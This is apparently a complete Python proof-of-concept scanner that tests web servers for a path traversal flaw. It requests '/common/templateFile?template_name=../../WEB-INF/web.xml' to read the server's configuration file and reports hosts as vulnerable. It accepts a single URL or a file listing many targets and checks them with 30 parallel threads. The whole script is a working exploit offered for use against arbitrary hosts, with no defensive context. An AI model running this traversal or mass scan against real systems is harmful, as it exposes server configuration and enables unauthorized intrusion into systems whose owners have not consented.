from lxml import etree
import requests
from multiprocessing.dummy import Pool
import argparse
import textwrap


def check(url):
    try:
        url = f"{url}/common/templateFile?template_name=../../WEB-INF/web.xml"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept - Encoding': 'gzip, deflate, br',
            'Accept-Language':  'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'close'
        }
        response = requests.get(url=url, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and 'web-app' in response.text:
            print(f'[*]{url}:存在漏洞')
        else:
            print('无法执行')
    except Exception as e:
        print('延时')


def main():
    parser = argparse.ArgumentParser(description="这 是 一 个 poc",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter,
                                     epilog=textwrap.dedent('''python cc.py -u http://127.0.0.1:8000/'''))
    parser.add_argument('-u', '--url', help="", dest='url')
    parser.add_argument('-r', '--rl', help="", dest='rl')
    args = parser.parse_args()
    u = args.url
    r = args.rl
    pool = Pool(processes=30)
    lists = []
    try:
        if u:
            check(u)
        elif r:
            with open(r, 'r') as f:
                for line in f.readlines():
                    target = line.strip()
                    if 'http' in target:
                        lists.append(target)
                    else:
                        targets = f"http://{target}"
                        lists.append(targets)
    except Exception as e:
        print(e)
    pool.map(check, lists)


if __name__ == '__main__':
    main()
